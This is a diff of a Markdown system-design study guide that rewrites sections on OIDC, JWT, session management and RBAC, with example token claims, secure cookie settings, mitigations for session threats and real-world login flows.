-  "exp": 123456789
+  "iss": "https://accounts.google.com",
+  "aud": "my-client-id",
+  "exp": 1711111111,
+  "iat": 1711107511
 }
 ```
 
 | Claim | Meaning |
 |-------|---------|
-| `sub` | Unique user identifier |
-| `name` | User name |
-| `email` | User email |
-| `iss` | Issuer |
-| `aud` | Audience |
-| `exp` | Expiration time |
+| `sub` | Stable unique user ID at this IdP |
+| `iss` | Issuer — who signed the token |
+| `aud` | Intended client application |
+| `exp` | Expiration — reject after this time |
 
-### Access token in OIDC
+#### OIDC scopes
 
-OIDC still uses OAuth **access tokens** for API access.
-
-```http
-Authorization: Bearer access_token
-```
-
-| Token | Purpose |
-|-------|---------|
-| **ID token** | Identity — who is the user |
-| **Access token** | API access — what APIs can be called |
-
-### Authorization code flow with OIDC
-
-Most common OIDC flow.
-
-```text
-User → application → identity provider → authentication → authorization code → backend exchange → ID token + access token
-```
-
-### OIDC scopes
-
-OIDC introduces identity scopes.
-
-| Scope | Purpose |
-|-------|---------|
+| Scope | Provides |
+|-------|----------|
 | `openid` | **Required** — enables OIDC |
-| `profile` | Basic user information |
-| `email` | User email |
-| `address` | Address information |
-| `phone` | Phone number |
-
-**Example:**
+| `profile` | Name, picture, etc. |
+| `email` | Email and verified flag |
 
 ```text
 scope=openid profile email
 ```
 
-### OpenID scope
+Without `openid` → OAuth-only flow (no standard ID token).
+
+#### Discovery and JWKS
+
+Clients fetch `/.well-known/openid-configuration` for authorize, token, UserInfo, and jwks URIs. **JWKS** publishes public keys:
 
 ```text
-scope=openid  →  application requests authentication (OIDC flow)
-
-Without openid → OAuth flow only
-With openid    → OIDC flow
+Receive ID token → fetch JWKS from iss → verify RS256 signature → validate iss, aud, exp, sub
 ```
 
-### UserInfo endpoint
-
-Provides additional user details beyond the ID token.
+#### UserInfo endpoint
 
 ```text
-Application → access token → UserInfo endpoint → user profile data
+GET /userinfo
+Authorization: Bearer <access_token>
+→ { "name": "John", "email": "john@example.com" }
 ```
 
-**Example response:**
+Use when claims beyond the ID token are needed; ID token alone is enough for many login flows.
 
-```json
-{
-  "name": "John",
-  "email": "john@example.com"
-}
+```mermaid
+flowchart LR
+    User[User] --> App[Client application]
+    App --> IdP[Identity provider]
+    IdP --> Login[Authenticate]
+    Login --> Tokens[ID token + access token]
+    Tokens --> App
+    App --> Verify[Verify ID token via JWKS]
+    Verify --> Session[Establish app session]
+    Tokens --> API[Call APIs with access token]
 ```
 
-### Discovery endpoint
+---
 
-Clients automatically discover OIDC configuration.
+### Pitfalls and design tips
 
-**Contains:** authorization endpoint · token endpoint · UserInfo endpoint · JWKS endpoint · supported scopes
+- **Validate ID tokens server-side** — never trust decoded JWT payload in the browser alone; check signature, `iss`, `aud`, `exp`, and `nonce` (for implicit/hybrid; code flow uses server exchange).
+- **Use `sub` as the stable user key** — email can change; `sub` is the canonical IdP identifier.
+- **Do not send ID tokens to APIs** — APIs expect access tokens; ID tokens are for the client to learn identity.
+- **Fetch JWKS with caching** — respect `kid` header to pick the right key; handle key rotation.
+- **OIDC ≠ OAuth** — interviewers often test whether you know OIDC adds identity on OAuth's delegation model.
+- **Default for enterprise SSO:** OIDC to Okta, Azure AD, or Keycloak; same pattern as social login.
 
-**Benefits:** simplifies integration; standardized configuration
+---
 
-### JWKS endpoint
+### Real-world example
 
-**JSON Web Key Set** — public keys to verify ID token signatures.
+**"Sign in with Google" on a SaaS dashboard**
 
-```text
-Receive ID token → fetch public key → verify signature → trust user identity
-```
+1. SaaS app redirects to Google with `scope=openid email profile` and `response_type=code`.
+2. User authenticates with Google and consents.
+3. Google returns an authorization code to the SaaS callback URL.
+4. SaaS backend exchanges the code at Google's token endpoint and receives an **ID token** (JWT) and **access token**.
+5. Backend verifies the ID token: signature against Google's JWKS, `aud` matches SaaS client ID, `exp` not passed, `email_verified` true if required.
+6. SaaS maps `sub` to a local user record (create or link) and creates its own session cookie.
+7. Optional: SaaS calls Google UserInfo or Google APIs with the **access token** — not with the ID token.
 
-### Token validation
-
-Before trusting an ID token, check:
-
-- Signature
-- Issuer (`iss`)
-- Audience (`aud`)
-- Expiration (`exp`)
-- Subject (`sub`)
-
-```text
-ID token → validate claims → user authenticated
-```
-
-### Single sign-on (SSO)
-
-OIDC is commonly used for SSO.
-
-```text
-Employee login → identity provider → access email, HR portal, payroll, wiki, internal tools
-```
-
-User logs in **once**.
-
-### Social login
-
-OIDC powers modern social logins — Google, Microsoft, Apple.
-
-```text
-Application → identity provider → authenticate user → ID token → user logged in
-```
-
-### OIDC in microservices
-
-```text
-User → frontend → identity provider → ID token + access token → API gateway → microservices
-```
-
-| Component | Typical token |
-|-----------|---------------|
-| **Microservices** | Access token |
-| **Frontend** | ID token |
-
-### OAuth 2.0 flow vs OIDC flow
-
-**OAuth 2.0:**
-
-```text
-User → authorization → access token → API access
-```
-
-**OIDC:**
-
-```text
-User → authentication → ID token + access token → application knows user identity
-```
-
-### OIDC architecture
-
-```text
-User → Client App → Identity Provider → ID Token (identity) + Access Token → Protected APIs
-```
-
-### Summary
-
-```text
-OIDC = authentication layer on OAuth 2.0 ("who is the user?")
-ID token (JWT) = identity; access token = API access
-Key pieces: openid scope, UserInfo, discovery, JWKS, SSO/social login
-```
+Google's OpenID Connect documentation describes this exact discovery, JWKS, and ID token claim set.
 
 ---
 
 ## 10.5 JWT
 
-### What is JWT?
+### Overview
 
-**JWT (JSON Web Token)** is a compact, self-contained token used to securely transfer information between parties. The information can be **verified** because it is digitally signed.
+Think of a JWT as a tamper-evident badge: the front shows your name and role, and a holographic seal proves the issuer printed it — if anyone scratches out "Visitor" and writes "Admin," the seal breaks. **JSON Web Tokens** carry signed claims between services without a central session lookup on every request.
 
-**Common uses:**
+Technically, a JWT is `Header.Payload.Signature` — Base64URL-encoded JSON plus a cryptographic signature (HMAC or RSA/ECDSA). Verifiers check the signature and standard claims (`exp`, `iss`, `aud`) to trust the payload. The payload is **encoded, not encrypted**; anyone holding the token can read it.
 
-- Authentication
-- Authorization
-- Single sign-on (SSO)
-- Service-to-service communication
+---
 
-JWT is commonly used in **stateless** systems.
+### What problem it fixes
 
-### Why JWT?
+**Session-based auth** requires a shared session store or sticky sessions so every server can resolve `SESSION_ID` → user. At scale across regions and microservices, that store becomes a bottleneck and failure point.
 
-**Traditional session approach:**
+JWTs enable **stateless verification**:
 
 ```text
-Client → session ID → server → session store
+Session: Client → session ID → server → session store lookup
+JWT:     Client → JWT → server → verify signature locally → trust claims
 ```
 
-Server must maintain session state.
+This suits APIs, microservices, and CDNs that cannot all reach one Redis cluster on every request.
 
-**JWT approach:**
+---
 
-```text
-Client → JWT → server
-```
+### What it does
 
-Server validates the token — **no session storage** required.
+A JWT **asserts** signed claims — identity (`sub`), roles, permissions, scopes, issuer, expiry — in a compact string suitable for HTTP headers. Common uses:
 
-**Benefits:** stateless · scalable · easy for distributed systems · suitable for APIs and microservices
+- Access tokens after login
+- Service-to-service auth (signed by auth service, verified by each microservice)
+- OIDC ID tokens (profile claims)
+- Short-lived, self-contained authorization hints
 
-### JWT structure
+It does **not** encrypt sensitive data by default (use JWE for encrypted tokens, rarely needed if tokens stay HTTPS-only and minimal).
 
-A JWT has three parts:
+---
+
+### How it works — the architecture inside
+
+#### Structure
 
 ```text
 Header.Payload.Signature
 
-Example: xxxxx.yyyyy.zzzzz
+Example: eyJhbGci....eyJzdWI....SflKxwRJ...
 ```
 
-Encoded using **Base64URL**.
-
-### Header
-
-Metadata about the token.
+**Header:**
 
 ```json
-{
-  "alg": "HS256",
-  "typ": "JWT"
-}
+{ "alg": "HS256", "typ": "JWT" }
 ```
 
-| Field | Meaning |
-|-------|---------|
-| `alg` | Signing algorithm |
-| `typ` | Token type |
-
-### Payload
-
-Contains **claims** (data).
+**Payload (claims):**
 
 ```json
 {
   "sub": "101",
   "name": "John",
-  "role": "ADMIN"
-}
-```
-
-Payload is **encoded, not encrypted** by default. Anyone with the token can decode and read it.
-
-**Do not store sensitive information** in JWT payloads.
-
-### Signature
-
-Verifies token integrity.
-
-```text
-HMACSHA256(Header + Payload + SecretKey)
-```
-
-If the payload changes → signature changes → token becomes **invalid**.
-
-### Visual structure
-
-```text
-Header + Payload + Secret key → Signature → JWT = Header.Payload.Signature
-```
-
-### Claims
-
-Pieces of information in the payload — user ID, role, permissions, issuer, expiration.
-
-**Categories:**
-
-- Registered claims
-- Public claims
-- Private claims
-
-### Registered claims
-
-Standard JWT claims.
-
-| Claim | Meaning |
-|-------|---------|
-| `sub` | Subject |
-| `iss` | Issuer |
-| `aud` | Audience |
-| `exp` | Expiration time |
-| `iat` | Issued at |
-| `nbf` | Not before |
-| `jti` | JWT identifier |
-
-```json
-{
-  "sub": "123",
+  "role": "ADMIN",
   "iss": "auth-service",
-  "exp": 1711111111
+  "aud": "api-gateway",
+  "exp": 1750000000,
+  "iat": 1749996400
 }
 ```
 
-### Public claims
-
-Custom claims with agreed naming across systems.
-
-```json
-{
-  "department": "Finance",
-  "location": "India"
-}
-```
-
-### Private claims
-
-Application-specific claims.
-
-```json
-{
-  "userId": 101,
-  "role": "ADMIN"
-}
-```
-
-Meaningful only within a particular application ecosystem.
-
-### JWT generation flow
+**Signature (HS256):**
 
 ```text
-User login → validate credentials → create claims → generate signature → return JWT
+HMACSHA256(base64url(header) + "." + base64url(payload), secret)
 ```
 
-### JWT authentication flow
+Tampering with payload invalidates the signature.
+
+#### Claim categories
+
+| Type | Examples |
+|------|----------|
+| **Registered** | `sub`, `iss`, `aud`, `exp`, `iat`, `nbf`, `jti` |
+| **Public** | Agreed names like `department` |
+| **Private** | App-specific `userId`, `permissions` |
+
+#### Authentication flow
 
 ```text
-User login → auth service → generate JWT → client stores JWT → client sends JWT → server validates → access granted
+Login → auth service validates credentials → build claims → sign JWT → return to client
+Client → Authorization: Bearer <JWT> → API validates → process request
 ```
 
-### JWT in API requests
+#### Signing algorithms
 
-Sent in HTTP headers:
-
-```http
-Authorization: Bearer eyJhbGciOi...
-```
+| Algorithm | Type | When to use |
+|-----------|------|-------------|
+| **HS256** | Symmetric — one shared secret | Single service or trusted small set |
+| **RS256 / ES256** | Asymmetric — private sign, public verify | Microservices, OIDC IdPs |
 
 ```text
-Client → bearer token → API → validate token → process request
+RS256: Auth service signs with private key → each microservice verifies with public key from JWKS
 ```
 
-### JWT validation
-
-Before trusting a JWT, validate:
-
-- Signature
-- Expiration
-- Issuer
-- Audience
-- Token format
+#### Access + refresh token pair
 
 ```text
-Receive token → verify signature → validate claims → allow access
+Access token:  short-lived (minutes), sent on every API call
+Refresh token: long-lived, stored securely, exchanged only at /token for new access token
 ```
 
-### Token expiration
+When access token expires → client sends refresh token → new access token (optionally rotate refresh token).
 
-JWTs usually include expiration:
+#### Revocation challenge
 
-```json
-{ "exp": 1750000000 }
+Stateless JWTs remain valid until `exp` unless you add:
+
+- Short `exp` (most common)
+- Token blocklist (Redis) for logout/compromise
+- `jti` versioning — bump user token version in DB; reject old version
+
+```mermaid
+flowchart LR
+    Login[User login] --> Auth[Auth service]
+    Auth --> Sign[Sign JWT with claims]
+    Sign --> Client[Client stores JWT]
+    Client --> API[API request Bearer JWT]
+    API --> Verify[Verify signature and exp]
+    Verify --> Claims[Extract sub role permissions]
+    Claims --> AuthZ[Authorization check]
+    AuthZ --> OK[Handle request]
 ```
 
-**Purpose:** reduce attack window; improve security
+---
 
-**Common practice:** access tokens are **short-lived**.
+### Pitfalls and design tips
 
-### Access token
+- **Never put secrets in the payload** — credit cards, passwords, PII; tokens leak via logs and browser extensions.
+- **Always validate `iss`, `aud`, `exp`, and signature** — skipping `aud` allows cross-service token replay.
+- **Prefer RS256 over HS256 in microservices** — avoids sharing the signing secret with every service.
+- **Short access token lifetime** — 15 minutes is common; use refresh tokens for UX.
+- **Do not store JWTs in localStorage if XSS is a risk** — HttpOnly cookies trade off CSRF complexity (see 10.6, 10.13).
+- **Large permission arrays bloat tokens** — use roles or server-side policy lookup.
+- **Libraries:** `jsonwebtoken` (Node), `PyJWT`, `jjwt` (Java), framework middleware — never hand-roll crypto.
 
-Used to access protected resources.
+---
 
-```http
-Authorization: Bearer access_token
-```
+### Real-world example
 
-**Contains:** user ID · roles · permissions · scopes
+**Auth0-issued access token for a SPA + API**
 
-**Characteristics:** short lifespan · frequently validated
+1. User logs in via Auth0 Universal Login (OIDC).
+2. Auth0 returns an access token JWT with `iss=https://tenant.auth0.com/`, `aud=https://api.myapp.com`, `sub=auth0|abc123`, and custom claim `permissions: ["read:reports"]`.
+3. SPA calls `GET https://api.myapp.com/reports` with `Authorization: Bearer <JWT>`.
+4. API middleware downloads Auth0 JWKS, verifies RS256 signature, checks `aud` and `exp`.
+5. Authorization middleware requires `read:reports` in claims before returning data.
+6. After 24 hours (or configured TTL), token expires; SPA uses refresh token silently to obtain a new access token.
 
-### Refresh token
-
-Used to obtain new access tokens.
-
-```text
-Access token expires → refresh token → authorization server → new access token
-```
-
-**Benefits:** fewer logins; better user experience
-
-### Signing algorithms
-
-| Algorithm | Type |
-|-----------|------|
-| **HS256** | HMAC SHA-256 |
-| **HS512** | HMAC SHA-512 |
-| **RS256** | RSA SHA-256 |
-| **ES256** | ECDSA SHA-256 |
-
-### Symmetric signing (HS256)
-
-Same secret key for signing and verification.
-
-```text
-Secret key → sign JWT → verify JWT
-```
-
-| Advantages | Challenges |
-|------------|------------|
-| Fast, simple | Secret must be shared with all verifiers |
-
-### Asymmetric signing (RS256)
-
-| Key | Use |
-|-----|-----|
-| **Private key** | Sign JWT |
-| **Public key** | Verify JWT |
-
-```text
-Private key → sign JWT → public key → verify JWT
-```
-
-**Benefits:** better key management; suitable for distributed systems
-
-### JWT in microservices
-
-```text
-User → API gateway → JWT → order service → payment service → inventory service
-```
-
-Each service can **independently verify** the token.
-
-**Benefits:** no centralized session store; better scalability
-
-### JWT revocation challenge
-
-JWT is stateless. Once issued, the server typically **cannot immediately invalidate** it everywhere.
-
-**Possible approaches:**
-
-- Short expiration times
-- Token blacklist
-- Token versioning
-- Refresh token rotation
-
-### JWT storage options
-
-| Location | Options |
-|----------|---------|
-| **Browser** | Local storage, session storage |
-| **Cookie** | HttpOnly cookie, secure cookie |
-| **Server** | Less common for JWT |
-
-Choice depends on security and application architecture.
-
-### Security considerations
-
-- Use HTTPS
-- Validate signatures
-- Use expiration times
-- Avoid sensitive payload data
-- Rotate signing keys
-- Validate issuer and audience
-- Use secure storage mechanisms
-- Implement refresh token rotation
-
-### High-level JWT architecture
-
-```text
-Client → Auth Service (login) → JWT → Client → API Gateway (Bearer) → Order Svc + Payment Svc (each validates JWT)
-```
-
-### Summary
-
-```text
-JWT = Header.Payload.Signature — signed, self-contained, stateless
-Claims: registered (sub, iss, exp), public, private
-HS256 = shared secret | RS256 = public/private key pair
-Pair short access tokens with refresh tokens; validate signature + exp + iss + aud
-```
+Auth0 documents this JWT validation flow with JWKS — a standard production pattern.
 
 ---
 
 ## 10.6 Session Management
 
-### What is session management?
+### Overview
 
-**Session management** is the process of maintaining user state across multiple requests after successful authentication.
+HTTP forgets you the moment each request ends — like a amnesiac receptionist. **Session management** gives the server a way to remember who you are across page loads: you log in once, receive a session ticket, and every later request presents that ticket so the server reloads your identity.
 
-HTTP is **stateless** — every request is independent. Session management helps the server **remember the user** between requests.
+Technically, after authentication the server creates a **session record** (user ID, roles, timestamps) keyed by a cryptographically random **session ID**. The client stores the ID — usually in an **HttpOnly cookie** — and sends it on each request. The server looks up session data before handling the request.
 
-```text
-User login → session created → user browses website → server recognizes user
-```
+---
 
-### Why session management?
+### What problem it fixes
 
-**Without sessions:**
+Without sessions (or equivalent tokens), users would re-enter credentials on every click. Stateless HTTP alone cannot maintain shopping carts, login state, or admin context.
 
-```text
-Request 1: login
-Request 2: server does not know who the user is
-Request 3: authentication required again
-```
+Sessions also enable:
 
-**With sessions:**
+- **Immediate logout** — delete server record; cookie becomes useless.
+- **Server-side invalidation** — revoke compromised sessions without waiting for token expiry.
+- **Rich server state** — store preferences, MFA level, impersonation flags alongside user ID.
 
-```text
-Login once → session created → session ID sent → subsequent requests recognized
-```
+The trade-off is **operational state** — something must store and replicate sessions at scale.
 
-**Benefits:** better user experience · persistent login state · user tracking during interaction
+---
 
-### Session
+### What it does
 
-A session represents a user's interaction with an application during a specific time period.
+Session management covers the full lifecycle:
 
-```text
-User: John
+1. **Create** — on successful login, generate session ID, persist session, set cookie.
+2. **Resume** — on each request, map session ID → user context.
+3. **Refresh** — extend idle timeout on activity.
+4. **Expire** — idle timeout, absolute max lifetime.
+5. **Destroy** — logout, security event, or admin revocation.
 
-Session (stored on server):
-{
-  userId: 101,
-  loginTime: "10:00 AM"
-}
+---
 
-Associated with a unique session ID.
-```
+### How it works — the architecture inside
 
-### Session ID
-
-Unique identifier for a session.
+#### Creation and lookup
 
 ```text
-sessionId = A8D9K3M2X7Y1
+Login → validate credentials → create session { userId, role, loginTime }
+→ generate sessionId → store in session store → Set-Cookie: SESSION_ID=…
 ```
-
-**Characteristics:** random · unique · difficult to guess
-
-Client stores the session ID and sends it with every request.
-
-### Session creation flow
 
 ```text
-User login → validate credentials → create session → generate session ID → store session → return session ID
+Next request: Cookie SESSION_ID=abc123 → lookup → User John, Role ADMIN → proceed
 ```
 
-### Session storage
+#### Session storage options
+
+| Approach | Pattern |
+|----------|---------|
+| **In-memory (single server)** | Simple; lost on restart; no scale |
+| **Sticky sessions** | Load balancer pins user to one server — fragile |
+| **Centralized store (Redis)** | All app servers read/write same sessions — preferred |
 
 ```text
-Session ID → session data
-
-{
-  userId: 101,
-  role: "ADMIN",
-  loginTime: "10:00"
-}
+Redis key: session:abc123
+Value:     { userId: 101, role: "ADMIN", lastActivity: … }
+TTL:       idle timeout (e.g. 30 minutes)
 ```
 
-### Session-based authentication flow
+#### Timeouts
+
+| Type | Behavior |
+|------|----------|
+| **Idle** | No activity for 30 min → expire |
+| **Absolute** | Max 8 hours from login regardless of activity |
 
 ```text
-User login → server creates session → store session data → return session ID → browser stores cookie → future requests → server finds session → access granted
+Login 10:00 → absolute cap 18:00 → session ends at 18:00 even if active
 ```
 
-### Session cookie
-
-Most common way to carry the session ID.
+#### Secure cookie flags
 
 ```http
-Set-Cookie: SESSION_ID=abc123
+Set-Cookie: SESSION_ID=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
 ```
 
-Browser automatically sends the cookie with future requests:
+| Flag | Purpose |
+|------|---------|
+| `HttpOnly` | JavaScript cannot read — mitigates XSS theft |
+| `Secure` | HTTPS only |
+| `SameSite` | Reduces cross-site cookie sending (CSRF aid) |
 
-```http
-Cookie: SESSION_ID=abc123
-```
+#### Threats
 
-### Session lookup
+| Attack | Mitigation |
+|--------|------------|
+| **Session fixation** | Issue **new** session ID after login |
+| **Session hijacking** | HTTPS, HttpOnly, short timeouts, rotate on privilege change |
+
+#### Microservices pattern
 
 ```text
-Incoming request → read session ID → find session → load user data → process request
-
-SESSION_ID=abc123 → User = John, Role = ADMIN
+Client → API gateway → validate session (Redis) → forward user headers to services
 ```
 
-### Session lifecycle
+Gateway or dedicated auth service owns session validation; microservices trust internal identity headers only on private networks.
 
-```text
-Login → session creation → active session → session expiration → session removal
+```mermaid
+flowchart LR
+    Login[User login] --> Create[Create session in Redis]
+    Create --> Cookie[Set session cookie]
+    Cookie --> Req[Browser requests]
+    Req --> LB[Load balancer]
+    LB --> App[App server]
+    App --> Redis[(Redis session store)]
+    Redis --> Context[Load user context]
+    Context --> Handler[Request handler]
 ```
 
-A session exists only for a **limited time**.
+---
 
-### Session timeout
+### Pitfalls and design tips
 
-Sessions usually expire after inactivity.
+- **Prefer centralized Redis over sticky sessions** — sticky breaks when servers drain for deploys.
+- **Regenerate session ID on login and privilege elevation** — stops fixation and limits hijack window.
+- **Set both idle and absolute timeouts** — idle for security; absolute for compliance.
+- **Do not put session IDs in URLs** — they leak via Referer headers and logs.
+- **Redis: use `SETEX` or TTL** — automatic cleanup beats scanning expired keys.
+- **Session vs JWT:** choose sessions when you need instant revocation and server-controlled logout; JWT when you need stateless cross-region verification.
+- **Production default:** Redis session store with `ioredis` / Spring Session / Django sessions cached in Redis.
 
-```text
-30 minutes inactive → session expired
-```
+---
 
-**Benefits:** improved security · automatic cleanup
+### Real-world example
 
-### Absolute expiration
+**Rails app with Redis session store**
 
-Session expires after a **fixed duration** regardless of activity.
+1. User posts credentials to `/login`; Rails authenticates against PostgreSQL.
+2. `Rails.application.config.session_store :redis_store` writes session data to Redis key `_app_session:abc123`.
+3. Browser receives `Set-Cookie: _app_session=abc123; HttpOnly; Secure; SameSite=Lax`.
+4. Each request includes the cookie; Rails middleware loads the session hash from Redis (~1 ms).
+5. User idle 30 minutes — Redis TTL expires key; next request redirects to login.
+6. User clicks Logout — Rails deletes Redis key and clears cookie immediately.
 
-```text
-Login: 10:00 AM
-Expiration: 06:00 PM
-```
-
-Even if active, session ends at 06:00 PM.
-
-### Idle timeout
-
-Session expires if the user remains **inactive**.
-
-```text
-Last activity: 10:00 AM
-Timeout: 30 minutes
-No activity until 10:30 AM → session expires
-```
-
-### Logout flow
-
-```text
-User clicks logout → delete session → invalidate session ID → remove cookie → access denied
-```
-
-### Stateful nature of sessions
-
-Session-based systems are **stateful** — the server maintains user state.
-
-```text
-Server memory: Session A, Session B, Session C
-```
-
-Every active session consumes resources.
-
-### Scaling challenge
-
-**Single server:** all sessions on one machine.
-
-**Multiple servers:**
-
-```text
-Request 1 → Server A (has session)
-Request 2 → Server B (may not have session)
-```
-
-### Sticky sessions
-
-Load balancer always routes a user to the **same server**.
-
-```text
-User A → all requests → Server A
-```
-
-| Benefits | Challenges |
-|----------|------------|
-| Simple implementation | Poor scalability |
-| | Server dependency |
-
-### Centralized session store
-
-Store sessions in **shared storage** (e.g. Redis).
-
-```text
-Server A + Server B → shared Redis session store
-```
-
-Both servers access the same sessions.
-
-**Benefits:** better scalability · high availability
-
-### Redis for session storage
-
-Popular choice — in-memory, fast lookup, expiration support.
-
-```text
-Key:   session:abc123
-Value: { userId: 101, role: "ADMIN" }
-```
-
-### Session replication
-
-Session data replicated between servers.
-
-```text
-Server A → replicate session → Server B
-```
-
-| Benefits | Challenges |
-|----------|------------|
-| Improved fault tolerance | Synchronization overhead |
-| | Increased complexity |
-
-### Session fixation
-
-Attack: attacker forces a known session ID **before** login.
-
-```text
-Attacker provides session ID → victim logs in → same session continues
-```
-
-**Protection:** generate a **new session ID after login**.
-
-### Session hijacking
-
-Attacker steals a valid session ID and impersonates the user.
-
-**Common causes:** insecure network · XSS attacks · cookie theft
-
-**Protection:** HTTPS · secure cookies · HttpOnly cookies
-
-### Secure cookies
-
-Cookie transmitted only over HTTPS.
-
-```http
-Set-Cookie: ...; Secure
-```
-
-Prevents transmission over plain HTTP.
-
-### HttpOnly cookies
-
-JavaScript cannot access the cookie.
-
-```http
-Set-Cookie: ...; HttpOnly
-```
-
-Protects against many XSS-based cookie theft attacks.
-
-### SameSite cookies
-
-Controls cross-site cookie behavior.
-
-**Values:** `Strict` · `Lax` · `None`
-
-```http
-Set-Cookie: ...; SameSite=Strict
-```
-
-Helps prevent CSRF attacks.
-
-### Session management in microservices
-
-```text
-Client → API gateway → session validation → shared session store → microservices
-```
-
-Session validation is often handled centrally by the API gateway or auth service.
-
-### Session architecture
-
-```text
-Client (cookie) → Load Balancer → Server A / Server B → shared Redis session store
-```
-
-### Summary
-
-```text
-Session management = server-side state across HTTP requests (session ID in cookie)
-Scale with Redis central store; avoid sticky sessions when possible
-Secure: new ID on login, HTTPS, HttpOnly, Secure, SameSite; idle + absolute timeout
-```
+This is the documented Rails + Redis session pattern used by many production web apps.
 
 ---
 
 ## 10.7 RBAC
 
-### What is RBAC?
+### Overview
 
-**Role-based access control (RBAC)** assigns users to **roles**; each role holds a set of **permissions**. Access decisions check whether the user's role includes the required permission.
+Instead of listing every employee's permissions individually, companies assign **job titles** — Manager, Engineer, Intern — each with a standard access package. **Role-based access control (RBAC)** does the same in software: users get **roles**, roles bundle **permissions**, and access checks ask whether the user's role includes the required permission.
 
-```text
-User → Role → Permissions → allow or deny
-```
+Technically, RBAC is a model where `User → Role → Permission` forms the authorization graph. A request maps to a required permission (e.g. `DELETE_USER`); the system resolves the caller's roles and allows the action if any role grants that permission.
 
-**Question answered:** What can this role do?
+---
 
-### Why RBAC?
+### What problem it fixes
 
-| Benefit | Description |
-|---------|-------------|
-| Easier permission management | Grant/revoke roles instead of individual permissions per user |
-| Reduced complexity | Group related permissions under named roles |
-| Consistent access | Same role = same permissions across users |
+Assigning dozens of permissions per user does not scale — onboarding is slow, audits are painful, and mistakes leave excess privilege.
 
-### Permissions
+RBAC fixes:
 
-A **permission** is an allowed action.
+- **Administrative overhead** — add user to `MANAGER` role instead of ticking 20 boxes.
+- **Inconsistent access** — same role means same permissions across users.
+- **Reviewability** — auditors inspect role definitions, not per-user ad hoc grants.
 
-**Examples:** `READ_USER` · `CREATE_USER` · `UPDATE_USER` · `DELETE_USER` · `VIEW_REPORTS` · `EXPORT_DATA`
+It struggles when rules need rich context ("only if same department and business hours") — that is ABAC (10.8).
 
-A user may have one or many permissions (via one or more roles).
+---
 
-### Roles
+### What it does
 
-A **role** is a collection of permissions.
+RBAC provides:
+
+- **Permissions** — atomic actions: `READ_USER`, `EXPORT_DATA`.
+- **Roles** — named sets: `ADMIN`, `MANAGER`, `USER`.
+- **User-role assignment** — users hold one or many roles.
+- **Enforcement** — API or UI checks role permissions before allow.
 
 ```text
 ADMIN
@@ -1678,3575 +981,1672 @@ USER
  └── READ_PROFILE
 ```
 
-### RBAC model
+---
 
-Users receive roles; roles contain permissions.
+### How it works — the architecture inside
 
-```text
-User: John
-Role: ADMIN
-Permissions: create user, delete user, update user
-```
-
-### RBAC request flow
-
-```text
-Request → check role → check permission → allow or deny
-```
-
-**Example:**
+#### Request flow
 
 ```http
 DELETE /users/101
 ```
 
 ```text
-1. User authenticated?
-2. User has role with DELETE_USER permission?
-
-Both true → access granted
+1. Authenticate user
+2. Load roles for user → e.g. ADMIN
+3. ADMIN includes DELETE_USER? → allow : deny
 ```
 
-### RBAC database design
+#### Database schema
 
 ```text
 Users          Roles           Permissions
------          -----           -----------
 id             id              id
 name           role_name       permission_name
 
 User_Roles          Role_Permissions
-----------          ----------------
-user_id             role_id
-role_id             permission_id
-
-User → Role → Permission
+user_id, role_id    role_id, permission_id
 ```
 
-### Fine-grained vs coarse-grained RBAC
+#### Granularity
 
-| | Fine-grained | Coarse-grained |
-|---|--------------|----------------|
-| **Level** | Per action on resource | Broad area |
-| **Example** | Can view customer ✓ · edit ✗ · delete ✗ | Admin area: ADMIN ✓ · USER ✗ |
-| **Benefits** | Better control and security | Simpler; faster checks |
-| **Common in** | Enterprise, banking | Simple apps |
+| Style | Example |
+|-------|---------|
+| **Coarse** | `ADMIN` vs `USER` for whole app |
+| **Fine** | `BILLING_READ`, `BILLING_WRITE`, `USER_DELETE` separately |
 
-### API authorization with RBAC
+Fine-grained RBAC suits enterprise and regulated industries; coarse suits small products.
 
-Protect APIs using role permissions.
+#### RBAC with JWT
 
-| Endpoint | Permission |
-|----------|------------|
-| `GET /users` | `READ_USER` |
-| `POST /users` | `CREATE_USER` |
-| `DELETE /users/{id}` | `DELETE_USER` |
-
-```text
-Request → authentication → permission check → allow or deny
-```
-
-### RBAC using JWT
-
-Roles or permissions may be stored in JWT claims.
+Roles embedded at token issuance:
 
 ```json
-{ "userId": 101, "role": "ADMIN" }
+{ "sub": "101", "roles": ["MANAGER"] }
 ```
 
-or
+Microservice loads permission matrix for `MANAGER` or trusts precomputed `permissions` claim — with stale-token trade-offs noted in 10.2.
 
-```json
-{ "permissions": ["READ_USER", "DELETE_USER"] }
-```
-
-```text
-Receive JWT → validate JWT → extract role/permissions → authorize request
-```
-
-### RBAC in microservices
-
-Each service may perform its own authorization checks using roles from tokens.
-
-```text
-User → API gateway → order service → payment service
-```
-
-**Common approaches:** JWT role claims · OAuth scopes · centralized policy service
-
-### RBAC architecture
-
-```text
-Client → API Gateway → Authorization Service → Role Store + User Store
-```
-
-### RBAC vs ABAC
+#### RBAC vs ABAC
 
 | | RBAC | ABAC |
 |---|------|------|
-| **Based on** | Roles and permissions | User, resource, and environment attributes |
-| **Complexity** | Simpler | More flexible; more complex |
-| **Best for** | Most business apps, admin panels | Dynamic rules, compliance, context-dependent access |
+| **Based on** | Static roles | Attributes + policies |
+| **Complexity** | Lower | Higher |
+| **Best for** | Org charts, admin UIs | Context rules, data classification |
 
-Production systems often combine both: RBAC for coarse access, ABAC for context-specific rules.
+Production systems often use **RBAC for coarse gates** and **ABAC for fine rules**.
 
-### Summary
-
-```text
-RBAC = User → Role → Permissions
-Store in Users/Roles/Permissions tables with join tables
-Use for straightforward access control; pair with JWT claims or API permission checks
+```mermaid
+flowchart LR
+    User[User] --> UR[User-role assignment]
+    UR --> Role[Role ADMIN]
+    Role --> RP[Role-permission map]
+    RP --> Perm[DELETE_USER permission]
+    Req[DELETE /users/101] --> Check{Role has permission?}
+    Perm --> Check
+    Check -->|Yes| Allow[Allow]
+    Check -->|No| Deny[403 Deny]
 ```
+
+---
+
+### Pitfalls and design tips
+
+- **Avoid role explosion** — too many narrowly defined roles recreate per-user permission sprawl.
+- **Separate duties** — do not bundle unrelated powers in one role (e.g. approve + pay).
+- **Do not rely on role name strings in code without a central matrix** — keep permission checks on permission constants, not `if role == "admin"`.
+- **Re-sync JWT claims on role change** — or use short TTLs; fired admin's token is dangerous until expiry.
+- **Kubernetes RBAC** is the interview classic — `Role`, `ClusterRole`, `RoleBinding` map users/service accounts to API verbs on resources.
+- **Default for internal tools:** 3–5 roles + explicit permission table; grow fine-grained only when needed.
+
+---
+
+### Real-world example
+
+**Kubernetes RBAC for a CI deploy bot**
+
